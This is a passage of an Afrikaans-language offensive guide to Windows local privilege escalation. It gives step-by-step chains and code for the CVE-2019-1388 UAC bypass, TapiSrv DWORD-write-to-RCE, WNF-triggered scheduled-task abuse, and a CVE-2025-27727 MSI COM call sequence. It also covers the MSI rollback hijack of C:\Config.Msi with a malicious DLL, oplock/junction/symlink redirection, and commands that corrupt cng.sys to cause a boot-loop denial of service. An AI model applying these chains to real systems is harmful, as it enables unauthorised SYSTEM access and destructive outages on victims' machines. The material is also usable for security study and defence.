Die volgende nutsmiddel laat jou ook toe om **’n named pipe-kommunikasie met ’n nutsmiddel soos burp te onderskep:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie nutsmiddel laat jou toe om alle pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Die Telephony-diens (TapiSrv) stel in bedienermodus `\\pipe\\tapsrv` (MS-TRP) beskikbaar. ’n Geoutentiseerde afgeleë kliënt kan die mailslot-gebaseerde asinkrone gebeurtenispad misbruik om `ClientAttach` in ’n arbitrêre **4-byte-skryfbewerking** na enige bestaande lêer te omskep wat deur `NETWORK SERVICE` geskryf kan word. Daarna kan die kliënt Telephony-administrateurregte verkry en ’n arbitrêre DLL as die diens laai. Die volledige verloop:

- `ClientAttach` met `pszDomainUser` ingestel op ’n bestaande skryfbare pad → die diens maak dit oop met `CreateFileW(..., OPEN_EXISTING)` en gebruik dit vir asinkrone gebeurtenisskryfbewerkings.
- Elke gebeurtenis skryf die aanvallerbeheerde `InitContext` vanaf `Initialize` na daardie handle. Registreer ’n lynprogram met `LRegisterRequestRecipient` (`Req_Func 61`), aktiveer `TRequestMakeCall` (`Req_Func 121`), haal dit met `GetAsyncEvents` (`Req_Func 0`) op, en deregistreer/sluit af om deterministiese skryfbewerkings te herhaal.
- Voeg jouself by `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, koppel weer, en roep dan `GetUIDllName` met ’n arbitrêre DLL-pad aan om `TSPI_providerUIIdentify` as `NETWORK SERVICE` uit te voer.

Meer besonderhede:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Diverse

### Lêeruitbreidings wat goed in Windows kan uitvoer

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute-misbruik via Markdown-renderers

Klikbare Markdown-skakels wat na `ShellExecuteExW` deurgegee word, kan gevaarlike URI-handlers (`file:`, `ms-appinstaller:` of enige geregistreerde skema) aktiveer en aanvallerbeheerde lêers as die huidige gebruiker uitvoer. Sien:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitering van opdragreëls vir wagwoorde**

Wanneer jy ’n shell as ’n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat uitgevoer word en **geloofsbriewe op die opdragreël deurgee**. Die onderstaande script vang elke twee sekondes prosesopdragreëls vas en vergelyk die huidige toestand met die vorige toestand, en voer enige verskille uit.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wagwoorde uit prosesse steel

## Van laevoorregte gebruiker na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang tot die grafiese koppelvlak het (via console of RDP) en UAC geaktiveer is, is dit in sommige weergawes van Microsoft Windows moontlik om ’n terminale of enige ander proses soos "NT\AUTHORITY SYSTEM" vanaf ’n gebruiker sonder voorregte uit te voer.

Dit maak dit moontlik om voorregte te eskaleer en terselfdertyd UAC te omseil met dieselfde kwesbaarheid. Daarbenewens hoef jy niks te installeer nie, en die binary wat tydens die proses gebruik word, is deur Microsoft onderteken en uitgereik.

Sommige van die stelsels wat geraak word, is die volgende:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Om hierdie kwesbaarheid uit te buit, moet die volgende stappe uitgevoer word:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Jy het al die nodige lêers en inligting in hierdie GitHub-bewaarplek:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Van Administrator met Medium-integriteitsvlak na High-integriteitsvlak / UAC Bypass

Lees dit om **meer oor Integrity Levels te leer**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lees dan **dit om meer oor UAC en UAC bypasses te leer:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Oplaai-directory-junctions na 'n webbediener se wortelgids

'n Toepassing kan 'n voorspelbare oplaai-subgids skep, 'n lêernaam wat deur die aanroeper verskaf is daarin skryf, en dan die lêer verwerk. As 'n gebruiker met lae voorregte daardie subgids kan verwyder en met 'n NTFS-junction kan vervang voordat die bedienerkant-skryfbewerking plaasvind, kan die skryfbewerking die junction volg na 'n gids wat deur die webbediener bedien word. 'n Skrip wat daar geplaas word, kan as die webdiens-identiteit loop indien die bediener daardie lêertipe uitvoer. Dit is 'n toepassingspesifieke arbitrary-write-grens; 'n skryfbare oplaai-gids of 'n bestaande junction bewys dit nie op sy eie nie.

Kontroleer die presiese padkonstruksie en tydsberekening in die oplaaihanteerder, die gebruiker se effektiewe regte om die subgids te verwyder en te skep, die bestemming se effektiewe ACLs, of die skrywer reparse points volg, en of die webbediener lêers in daardie bestemming uitvoer. Bevestig die skrywer en webbediener se prosesidentiteite afsonderlik. Passiewe inventaris kan gids-ACLs en reparse-metadata wys, maar dit kan nie die hanteerder se gedrag of 'n toekomstige junction-vervanging bevestig nie. As uitvoering in 'n diensrekening plaasvind, inspekteer die **werklike proses-token** voordat jy enige afsonderlike token-voorregroete oorweeg.

## Opruiming deur 'n bevoorregte geskeduleerde taak wat deur WNF geaktiveer word

'n Geskeduleerde taak wat handmatige uitvoering weier, kan steeds 'n onvoorregte sneller blootlê. Wanneer jy 'n bevoorregte taak oudit, voer sy XML uit en inspekteer **al** die snellers, asook die taak se DACL, principal en aksie. In die besonder benoem 'n `WnfStateChangeTrigger` 'n Windows Notification Facility (WNF)-toestand; as daardie beveiligbare toestand die huidige gebruiker toelaat om 'n opdatering te publiseer, kan die gebruiker die taak indirek onder sy gekonfigureerde identiteit begin ondanks `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Byvoorbeeld, die Recall-taak `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` het as SYSTEM geloop, opdaterings van 'n standaardgebruiker na WNF-toestand `7508BCA32C079E41` aanvaar, en daarna `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` ondersoek, selfs wanneer Recall gedeaktiveer was.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Om bereikbaarheid te toets, verkry `ZwUpdateWnfStateData` vanaf `ntdll.dll`, stuur ’n leë opdatering vir die agtgrepe-toestandnaam en vergelyk die terugkeert status met die taak se laaste-uitvoering-data of Procmon-aktiwiteit. Die volgende vereenvoudigde toetsprogram gebruik die greepvolgorde uit die Recall-taakvoorbeeld; vervang dit met die grepe wat uitgevoer is vir die taak wat getoets word.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Om rekursiewe opruiming in bevoorregte verwydering te verander

Die nuttige primitief is nie die trigger alleen nie, maar ’n bevoorregte opruimingsroetine wat ’n aanvaller-beheerde gids aanvaar. Volg die bewerking van enumerasie tot die finale mutasie: profiel-/sessie-ontdekking, wildcard-geselekteerde kinders, `SHCreateItemFromParsingName` en `IFileOperation::DeleteItem` is sterk aanduidings dat ’n voorheen nagegane padnaam later rekursief deurkruis sal word. As afstammelinge nie relatief tot vertroude gids-handvatsels oopgemaak en voor verwydering gevalideer word nie, kan ’n aanvaller die resolusie tussen enumerasie en gebruik verander.<sup>[[43]](#references)</sup>

Kombineer die WNF-trigger met die [oplock-, junction- en Object Manager-simboliese skakelaarvervanging](#from-folder-contents-delete-to-system-eop) wat hieronder beskryf word: die oplock laat die opruimer wag nadat dit die wettige kind gekies het, terwyl die skryfbare voorouer vervang word sodat die hervatte bevoorregte verwydering deur `\RPC Control` na die beskermde teiken verwys. In die Recall-ketting het dit gelei tot die SYSTEM-verwydering van `C:\Config.Msi` wat deur die gedokumenteerde MSI-terugdraaitegniek vereis word.<sup>[[31]](#references)[[43]](#references)</sup>

### Geneste afstammelinge omseil oppervlakkige reparse-punt-regstellings

Om slegs die aanvaller-beheerde wortel en sy onmiddellike kind te valideer, beveilig nie ’n rekursiewe padnaamgebaseerde verwydering nie. Hou daardie nagegane voorwerpe wettig en skuif die junction-/oplock-vervanging na ’n bykomende kind daaronder; `IFileOperation::DeleteItem` bereik uiteindelik die ongevalideerde afstammeling en volg die nuwe teiken daarvan. CVE-2026-20941 is presies deur hierdie soort onvolledige regstelling veroorsaak nadat die eerste Recall-regstelling `UKP` en die gids met ’n GUID-agtige naam gevalideer het, maar die ou rekursiewe verwyderingsbewerking behou het.<sup>[[43]](#references)</sup>

Die veilige patroon is om **elke afstammeling** relatief tot ’n reeds vertroude gids-handvatsel oop te maak, die finale opgeloste pad/voorwerp te verkry en te verifieer, en die verwyderingsdisposisie op daardie geverifieerde handvatsel toe te pas. Moenie ’n voorvoegsel valideer en dan terugkeer na rekursiewe padgebaseerde verwydering nie. Inspekteer tydens die hersiening van regstellings ook strukture by die werklike oproepterrein: in hierdie geval het looptyd-inspeksie van `OBJECT_ATTRIBUTES` by `NtCreateFile` ’n nie-nul `RootDirectory` en ’n relatiewe `{GUID}\\secure_file.lock`-naam getoon, wat die misleidende decompiler-uitset weerlê het wat ’n tweede `FILE_DELETE_ON_CLOSE`-primitief gesuggereer het.<sup>[[43]](#references)</sup>

## Van arbitrêre gidsverwydering/-verskuiwing/-hernoeming na SYSTEM EoP

Die tegniek wat [**in hierdie blogplasing**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beskryf word, met exploit-kode [**hier beskikbaar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Die aanval bestaan basies uit die misbruik van Windows Installer se terugdraaifunksie om wettige lêers tydens die deïnstallasieproses met kwaadwillige lêers te vervang. Hiervoor moet die aanvaller ’n **kwaadwillige MSI-installeerder** skep wat gebruik sal word om die `C:\Config.Msi`-gids te kaap. Windows Installer sal dié gids later gebruik om terugdraa lêers tydens die deïnstallasie van ander MSI-pakkette te stoor; die terugdraa lêers sal gewysig wees om die kwaadwillige payload te bevat.

### Windows Installer COM-inspuiting van die opruimingspad (CVE-2025-27727)

’n Kliënt met lae voorregte kan die SYSTEM-`msiexec.exe`-diens bereik deur die `CMsiConfigurationManager` COM-objek (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Omgekeerde ingenieurswese het die relevante `IMsiServer`-oproepe geïdentifiseer as `MsiBeginTransactionW` by vtable-offset `0xA0`, `SetEEUIDirectoryAndFilter` by `0xC8` en `CleanupTempPackages` by `0x50`. Hierdie name en offsets is deur omgekeerde ingenieurswese bepaal en kan tussen builds verskil.<sup>[[41]](#references)</sup>

Vir ’n nie-administrateur gee `SetEEUIDirectoryAndFilter` voor as die oproeper slegs terwyl dit die verskafte pad oopmaak met `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` en `FILE_FLAG_OPEN_REPARSE_POINT`. Dit bewys dat die oproeper die gids kan verwyder en voorkom dat ’n reparse-punt gevolg word, maar dit bind **nie** die nagegane lêervoorwerp aan latere opruiming nie, en bewys ook nie dat Windows Installer dit geskep het nie.<sup>[[41]](#references)</sup>

Ná `MsiBeginTransactionW` skeduleer `SetEEUIDirectoryAndFilter` die pad as ’n gids, ongeag die filterargument van die oproeper. Die diens skryf ’n benoemde `REG_DWORD`-waarde onder `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: die waardenaam is die oproeper-beheerde pad en data `0x00000002` is die gidsvlag. `CleanupTempPackages(NULL, FALSE)` begin dan die opruiming direk. Die verhoogde werker enumereer die registerwaardes en gee gidsinskrywings aan rekursiewe `FDeleteFolder` deur sonder om die pad se herkoms na te gaan. As gewone verwydering misluk, roep die kode ook `LockdownPath` aan, vee lêerkenmerke uit en probeer weer.<sup>[[41]](#references)</sup>

Die minimale oproepvolgorde wat uit `msi.dll` herwin is, is:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Die nuttige primitief is padhergebruik, nie ’n junction-herleiding nie. Registreer ’n aanvaller-geskepte `C:\Config.Msi`, verwyder dit en laat Windows Installer later dieselfde padnaam met beskermde rollback-data herskep. Opruiming vertrou die verouderde `TempPackages`-naam en verwyder die nuwe gids as SYSTEM. Dit omseil die beoogde grens van `FILE_FLAG_OPEN_REPARSE_POINT` en die versagting vir vertroue in herleiding, omdat geen reparse point nodig is nie.<sup>[[41]](#references)</sup>

Hierdie uitvee-primitief pas in die rollback-ketting hieronder: behou die afsonderlike `Installer\Folders`-rekord, verwyder die beskermde `C:\Config.Msi`, herskep dit met ’n NULL DACL en behou ’n handvatsel met `WRITE_DAC` voordat die installer die DACL verhard. Die vooraf oopgemaakte handvatsel kan ’n permissiewe DACL met `NtSetSecurityObject` herstel, waarna die gegenereerde `.rbs` vervang kan word voordat rollback hervat.<sup>[[41]](#references)</sup>

Microsoft het die pad reggestel deur te keer dat `CMsiTransaction::SetEEUIDirectoryAndFilter` `ScheduleFileOrFolderDelete` aanroep wanneer die nuwe feature gate geaktiveer is. Die COM-aanroep kan steeds sukses teruggee, maar plaas nie meer die aanvaller-beheerde pad in `TempPackages` nie. Pas die Windows-sekuriteitsopdaterings van April 2025 toe eerder as om ’n suksesvolle metode-terugkeer as ’n toets vir die pleister te gebruik.<sup>[[41]](#references)[[42]](#references)</sup>

Die opgesomde tegniek is soos volg:

1. **Fase 1 – Voorbereiding vir die kaping (laat `C:\Config.Msi` leeg)**

- Stap 1: Installeer die MSI
    - Skep ’n `.msi` wat ’n onskadelike lêer (bv. `dummy.txt`) in ’n skryfbare gids (`TARGETDIR`) installeer.
    - Merk die installer as **"UAC Compliant"**, sodat ’n **nie-admin-gebruiker** dit kan laat loop.
    - Hou ’n **handvatsel** na die lêer oop ná die installasie.

- Stap 2: Begin die deïnstallering
    - Deïnstalleer dieselfde `.msi`.
    - Die deïnstalleringsproses begin lêers na `C:\Config.Msi` skuif en hulle na `.rbf`-lêers (rollback-rugsteunlêers) hernoem.
    - **Poll die oop lêerhandvatsel** met `GetFinalPathNameByHandle` om vas te stel wanneer die lêer `C:\Config.Msi\<random>.rbf` word.

- Stap 3: Pasgemaakte sinkronisering
    - Die `.msi` bevat ’n **pasgemaakte deïnstalleringsaksie (`SyncOnRbfWritten`)** wat:
        - Aandui wanneer `.rbf` geskryf is.
        - Dan **wag** op ’n ander gebeurtenis voordat die deïnstallering voortgaan.

- Stap 4: Verhoed dat `.rbf` uitgevee word
    - Wanneer die sein ontvang word, **maak die `.rbf`-lêer oop** sonder `FILE_SHARE_DELETE` — dit **verhoed dat dit uitgevee word**.
    - Stuur dan **’n sein terug** sodat die deïnstallering kan klaarmaak.
    - Windows Installer slaag nie daarin om die `.rbf` uit te vee nie, en omdat dit nie al die inhoud kan uitvee nie, **word `C:\Config.Msi` nie verwyder nie**.

- Stap 5: Vee `.rbf` handmatig uit
    - Jy (die aanvaller) vee die `.rbf`-lêer handmatig uit.
    - Nou is **`C:\Config.Msi` leeg**, gereed om gekaap te word.

> Op hierdie punt, **aktiveer die SYSTEM-vlak-kwesbaarheid vir die uitvee van ’n arbitrêre gids** om `C:\Config.Msi` uit te vee.

2. **Fase 2 – Vervang terugrolskripte met kwaadwillige skripte**

- Stap 6: Herskep `C:\Config.Msi` met swak ACL’s
    - Herskep self die `C:\Config.Msi`-gids.
    - Stel **swak DACL’s** (bv. Everyone:F) in en **hou ’n handvatsel oop** met `WRITE_DAC`.

- Stap 7: Laat nog ’n installasie loop
    - Installeer die `.msi` weer, met:
        - `TARGETDIR`: Skryfbare ligging.
        - `ERROROUT`: ’n Veranderlike wat ’n gedwonge mislukking veroorsaak.
    - Hierdie installasie sal gebruik word om **rollback** weer te aktiveer, wat `.rbs` en `.rbf` lees.

- Stap 8: Monitor vir `.rbs`
    - Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat ’n nuwe `.rbs` verskyn.
    - Vang die lêernaam op.

- Stap 9: Sinkroniseer voor rollback
    - Die `.msi` bevat ’n **pasgemaakte installasie-aksie (`SyncBeforeRollback`)** wat:
        - ’n Gebeurtenis aandui wanneer die `.rbs` geskep word.
        - Dan **wag** voordat dit voortgaan.

- Stap 10: Pas swak ACL’s weer toe
    - Nadat die gebeurtenis `.rbs created` ontvang is:
        - Pas Windows Installer weer sterk ACL’s op `C:\Config.Msi` toe.
        - Maar omdat jy steeds ’n handvatsel met `WRITE_DAC` het, kan jy **swak ACL’s weer toepas**.

> ACL’s word **slegs afgedwing wanneer ’n handvatsel oopgemaak word**, dus kan jy steeds na die gids skryf.

- Stap 11: Plaas vals `.rbs` en `.rbf`
    - Oorskryf die `.rbs`-lêer met ’n **vals rollback-skrip** wat Windows opdrag gee om:
        - Jou `.rbf`-lêer (kwaadwillige DLL) na ’n **bevoorregte ligging** terug te plaas (bv. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Plaas jou vals `.rbf` met ’n **kwaadwillige DLL-loonvrag op SYSTEM-vlak**.

- Stap 12: Aktiveer rollback
    - Stuur die sinkroniseringsein sodat die installer hervat.
    - ’n **tipe 19-pasgemaakte aksie (`ErrorOut`)** is opgestel om die installasie **doelbewus** op ’n bekende punt te laat misluk.
    - Dit laat **rollback** begin.

- Stap 13: SYSTEM installeer jou DLL
    - Windows Installer:
        - Lees jou kwaadwillige `.rbs`.
        - Kopieer jou `.rbf`-DLL na die teikenligging.
    - Nou is jou **kwaadwillige DLL in ’n pad wat deur SYSTEM gelaai word**.

- Laaste stap: Voer SYSTEM-kode uit
    - Laat ’n vertroude **outomaties verhoogde binêre lêer** (bv. `osk.exe`) loop wat die DLL laai wat jy gekaap het.
    - **Boem**: Jou kode word **as SYSTEM** uitgevoer.


### Van arbitrêre lêeruitvee/-skuif/-hernoem na SYSTEM-EoP

Die hoof-MSI-rollback-tegniek (die vorige een) veronderstel dat jy ’n **hele gids** (bv. `C:\Config.Msi`) kan uitvee. Maar wat as jou kwesbaarheid slegs **arbitrêre lêers kan uitvee**?

Jy kan **NTFS-internals** uitbuit: elke gids het ’n versteekte alternatiewe datastroom genaamd:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Hierdie stroom stoor die **indeksmetadata** van die vouer.

As jy dus die `::$INDEX_ALLOCATION`-stroom van ’n vouer **uitvee**, **verwyder** NTFS die hele vouer uit die lêerstelsel.

Jy kan dit met standaard-API’s vir die uitvee van lêers doen, soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Alhoewel jy ’n *file*-delete-API aanroep, **vee dit die folder self uit**.

### Van die uitvee van folder-inhoud na SYSTEM EoP
Wat as jou primitive jou nie toelaat om arbitrêre files/folders uit te vee nie, maar dit **wel toelaat om die *inhoud* van ’n folder wat deur ’n aanvaller beheer word, uit te vee**?

1. Stap 1: Stel ’n lokfolder en -file op
- Skep: `C:\temp\folder1`
- Binne-in: `C:\temp\folder1\file1.txt`

2. Stap 2: Plaas ’n **oplock** op `file1.txt`
- Die oplock **onderbreek uitvoering** wanneer ’n geprivilegieerde proses probeer om `file1.txt` uit te vee.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Stap 3: Laat SYSTEM-proses aktiveer (bv. `SilentCleanup`)
- Hierdie proses skandeer vouers (bv. `%TEMP%`) en probeer om hul inhoud te verwyder.
- Wanneer dit by `file1.txt` kom, **aktiveer die oplock** en gee beheer oor aan jou callback.

4. Stap 4: Herlei die verwydering binne die oplock-callback

- Opsie A: Skuif `file1.txt` elders heen
    - Dit maak `folder1` leeg sonder om die oplock te verbreek.
    - Moenie `file1.txt` direk verwyder nie — dit sal die oplock voortydig vrystel.

- Opsie B: Skakel `folder1` om na ’n **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opsie C: Skep ’n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dit teiken die interne NTFS-stroom wat vouermetadata stoor — as jy dit uitvee, word die vouer uitgevee.

5. Stap 5: Laat die oplock los
- Die SYSTEM-proses gaan voort en probeer om `file1.txt` uit te vee.
- Maar nou, weens die junction + symlink, vee dit eintlik die volgende uit:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Resultaat**: `C:\Config.Msi` word deur SYSTEM uitgevee.

### Van die Skep van ’n Willekeurige Gids tot Permanente DoS

Benut ’n primitive waarmee jy **’n willekeurige gids as SYSTEM/admin kan skep** — selfs al **kan jy nie lêers skryf nie** of **swak toestemmings instel nie**.

Skep ’n **gids** (nie ’n lêer nie) met die naam van ’n **kritieke Windows-driver**, bv.:
```
C:\Windows\System32\cng.sys
```

- Hierdie pad stem normaalweg ooreen met die `cng.sys` kernel-mode-driver.
- As jy dit **vooraf as ’n vouer skep**, slaag Windows nie daarin om die werklike driver tydens opstart te laai nie.
- Daarna probeer Windows om `cng.sys` tydens opstart te laai.
- Dit sien die vouer, **kan nie die werklike driver vind nie**, en **loop vas of stop tydens opstart**.
- Daar is **geen terugvalopsie** en **geen herstel** sonder eksterne ingryping nie (bv. opstartherstel of skyftoegang).

### Van bevoorregte log-/rugsteunpaaie + OM-simboliese skakels na arbitrêre lêeroorskrywing / opstart-DoS

Wanneer ’n **bevoorregte diens** logs/uitvoere skryf na ’n pad wat uit ’n **skryfbare konfigurasie** gelees word, herlei daardie pad met **Object Manager-simboliese skakels + NTFS-koppelpunte** om die bevoorregte skryfbewerking in ’n arbitrêre oorskrywing te verander (selfs **sonder SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Vereistes**
- Die konfigurasie wat die teikenpad stoor, is skryfbaar deur die aanvaller (bv. `%ProgramData%\...\.ini`).
- Die vermoë om ’n koppelpunt na `\RPC Control` en ’n OM-lêersimboliese skakel te skep (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- ’n Bevoorregte bewerking wat na daardie pad skryf (log, uitvoer, verslag).

**Voorbeeldketting**
1. Lees die konfigurasie om die bevoorregte logbestemming te vind, bv. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Herlei die pad sonder adminregte:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Wag totdat die bevoorregte komponent die log skryf (bv. die admin aktiveer “stuur toets-SMS”). Die skryfaksie beland nou in `C:\Windows\System32\cng.sys`.
4. Inspekteer die oorskryfde teiken (hex/PE-parser) om korrupsie te bevestig; ’n herlaai dwing Windows om die gewysigde driver-pad te laai → **boot loop DoS**. Dit geld ook vir enige beskermde lêer wat ’n bevoorregte diens vir skryfwerk sal oopmaak.

> `cng.sys` word gewoonlik vanaf `C:\Windows\System32\drivers\cng.sys` gelaai, maar as daar ’n kopie in `C:\Windows\System32\cng.sys` bestaan, kan dit eerste probeer word, wat dit ’n betroubare DoS-teiken vir korrupte data maak.



## **Van High Integrity na System**

### **Nuwe service**

As jy reeds in ’n High Integrity-proses loop, kan die **pad na SYSTEM** maklik wees: **skep en voer bloot ’n nuwe service uit**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Wanneer jy ’n service-binary skep, maak seker dat dit ’n geldige service is of dat die binary vinnig die nodige aksies uitvoer, aangesien dit binne 20s beëindig sal word as dit nie ’n geldige service is nie.

### AlwaysInstallElevated

Vanuit ’n High Integrity-proses kan jy probeer om **die AlwaysInstallElevated-registerinskrywings te aktiveer** en ’n reverse shell te **installeer** met ’n _**.msi**_-wrapper.\
[Meer inligting oor die betrokke registersleutels en hoe om ’n _.msi_-pakket te installeer, is hier beskikbaar.](#alwaysinstallelevated)

### High + SeImpersonate-privilege na System

**Jy kan** [**die kode hier vind**](seimpersonate-from-high-to-system.md)**.**

### Van SeDebug + SeImpersonate na Full Token-privileges

As jy daardie token-privileges het (jy sal dit waarskynlik in ’n bestaande High Integrity-proses vind), sal jy met die SeDebug-privilege **byna enige proses kan oopmaak** (behalwe protected processes), die **token van die proses kan kopieer**, en ’n **willekeurige proses met daardie token kan skep**.\
Met hierdie tegniek word gewoonlik **enige proses wat as SYSTEM loop en al die token-privileges het, gekies** (_ja, jy kan SYSTEM-prosesse vind wat nie al die token-privileges het nie_).\
**Jy kan ’n** [**kodevoorbeeld van die voorgestelde tegniek hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

meterpreter gebruik hierdie tegniek om in `getsystem` te eskaleer. Die tegniek behels **dat ’n pipe geskep word en dan ’n service geskep/misbruik word om na daardie pipe te skryf**. Daarna sal die **server** wat die pipe met die **`SeImpersonate`**-privilege geskep het, die **token van die pipe-kliënt** (die service) kan impersonate en SYSTEM-privileges verkry.\
As jy [**meer oor named pipes wil leer, lees dit**](#named-pipe-client-impersonation).\
As jy ’n voorbeeld wil lees van [**hoe om met named pipes van High Integrity na System te gaan, lees dit**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om ’n dll wat deur ’n proses wat as **SYSTEM** loop, **gelaai** word te **hijack**, sal jy arbitrêre kode met daardie permissions kan uitvoer. Daarom is Dll Hijacking ook nuttig vir hierdie soort privilege escalation. Boonop is dit **veel makliker om vanuit ’n High Integrity-proses te doen**, aangesien dié proses **skryftoestemmings** sal hê op die dopgehou wat gebruik word om dlls te laai.\
**Jy kan** [**hier meer oor Dll hijacking leer**](dll-hijacking/index.html)**.**

### **Van Administrator of Network Service na System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Van LOCAL SERVICE of NETWORK SERVICE na full privileges

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Meer hulp

[Static impacket-binaries](https://github.com/ropnop/impacket_static_binaries)

## Nuttige tools

**Beste tool om Windows local privilege escalation-vektore te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir verkeerde konfigurasies en sensitiewe lêers (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Bespeur.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir moontlike verkeerde konfigurasies en versamel inligting (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir verkeerde konfigurasies**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit onttrek gestoorde sessie-inligting van PuTTY, WinSCP, SuperPuTTY, FileZilla en RDP. Gebruik -Thorough plaaslik.**\
